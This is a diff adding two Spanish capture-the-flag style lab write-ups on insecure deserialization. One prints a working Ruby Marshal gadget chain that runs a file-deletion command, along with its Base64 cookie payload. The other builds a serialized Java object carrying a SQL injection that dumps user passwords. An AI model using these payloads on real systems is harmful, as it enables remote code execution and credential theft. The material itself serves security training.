@@ -118,3 +118,164 @@ Finalmente, esta cookie maliciosa se inyecta en la sesión y, al ser deserializa
   echo $cookie;
 ?>
 ```
+
+## Reto 7: Explotación de la deserialización de Ruby mediante una cadena de gadgets documentada
+
+Este laboratorio utiliza un mecanismo de sesión basado en serialización y el framework Ruby on Rails. Existen exploits documentados que permiten la ejecución remota de código mediante una cadena de gadgets en este framework.
+
+Para resolver el laboratorio, busque un exploit documentado y adáptelo para crear un objeto serializado malicioso que contenga una carga útil de ejecución remota de código. Luego, pase este objeto al sitio web para eliminarlo. morale.txtarchivo del directorio de inicio de Carlos.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+En esta primera parte del laboratorio, examinamos la cookie de sesión y detectamos que contiene un objeto serializado en formato Ruby (Marshal). Al no disponer de acceso al código fuente, recurrimos a la búsqueda de exploits conocidos.
+
+Localizamos un gadget de deserialización universal para Ruby 2.x–3.x desarrollado por vakzz, que permite la ejecución remota de comandos (RCE) en aplicaciones Ruby on Rails vulnerables. Este gadget será la base para construir nuestro objeto malicioso.
+
+Modificamos el script del gadget encontrado para que ejecute ‘rm /home/carlos/morale.txt‘, y adaptamos su salida para que genere el objeto en formato Base64.
+
+Este objeto se inserta en la cookie de sesión y se codifica en URL antes de ser enviado al servidor.
+
+El backend deserializa el objeto malicioso y ejecuta el comando, eliminando el archivo y resolviendo el laboratorio.
+
+```ruby
+#!/usr/bin/ruby
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts Base64.encode64(payload)
+```
+Este script nos devuelve la siguiente cadena en base64 con el payload para sustituir en la cookie de sesión 
+
+```shell
+BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
+```
+
+## Reto 8: Desarrollo de una cadena de gadgets personalizada para la deserialización de Java
+
+Este laboratorio utiliza un mecanismo de sesión basado en serialización. Si logra construir una cadena de gadgets adecuada, puede aprovechar la deserialización insegura de este laboratorio para obtener la contraseña del administrador.
+
+Para resolver el laboratorio, acceda al código fuente y úselo para construir una cadena de gadgets y obtener la contraseña del administrador. Luego, inicie sesión como administratory eliminar carlos.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter
+
+Tenga en cuenta que para resolver este laboratorio se requiere familiaridad básica con otro tema que hemos cubierto en la Academia de Seguridad Web . 
+
+
+Necesitamos tres ficheros en java para poder serializar y deserializar y obtener la contraseña de la base de datos, para ello podemos abusar y extraer datos de la base de datos con la siguiente sentencia en SQL:
+
+```java
+import data.productcatalog.ProductTemplate;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.util.Base64;
+
+class Main {
+    public static void main(String[] args) throws Exception {
+        ProductTemplate originalObject = new ProductTemplate("' union select NULL,NULL,NULL,cast(string_agg(username||':'||password,',') as numeric),NULL,NULL,NULL,NULL from users-- -");
+
+        String serializedObject = serialize(originalObject);
+
+        System.out.println("Serialized object: " + serializedObject);
+
+        ProductTemplate deserializedObject = deserialize(serializedObject);
+
+        System.out.println("Deserialized object ID: " + deserializedObject.getId());
+    }
+
+    private static String serialize(Serializable obj) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
+        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
+            out.writeObject(obj);
+        }
+        return Base64.getEncoder().encodeToString(baos.toByteArray());
+    }
+
+    private static <T> T deserialize(String base64SerializedObj) throws Exception {
+        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
+            @SuppressWarnings("unchecked")
+            T obj = (T) in.readObject();
+            return obj;
+        }
+    }
+}
+```
+
+```java
+// All logic removed from ProductTemplate as it's not needed for serialization
+
+package data.productcatalog;
+
+import java.io.Serializable;
+
+public class ProductTemplate implements Serializable
+{
+    static final long serialVersionUID = 1L;
+
+    private final String id;
+    private transient Product product;
+
+    public ProductTemplate(String id)
+    {
+        this.id = id;
+    }
+
+    public String getId() {
+        return id;
+    }
+}
+```
+
+```java
+package data.productcatalog;
+class Product {}
+```
+
+Para compilar el programa tenemos que hacer los siguientes comandos:
+
+```
+javac Main.java
+java Main
+```
+De salida obtendremos la sentencia SQL serializada para poder cambiarla por nuestra cookie de sesion
+
+```
+Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAeScgdW5pb24gc2VsZWN0IE5VTEwsTlVMTCxOVUxMLGNhc3Qoc3RyaW5nX2FnZyh1c2VybmFtZXx8JzonfHxwYXNzd29yZCwnLCcpIGFzIG51bWVyaWMpLE5VTEwsTlVMTCxOVUxMLE5VTEwgZnJvbSB1c2Vycy0tIC0=
+Deserialized object ID: ' union select NULL,NULL,NULL,cast(string_agg(username||':'||password,',') as numeric),NULL,NULL,NULL,NULL from users-- -
+```
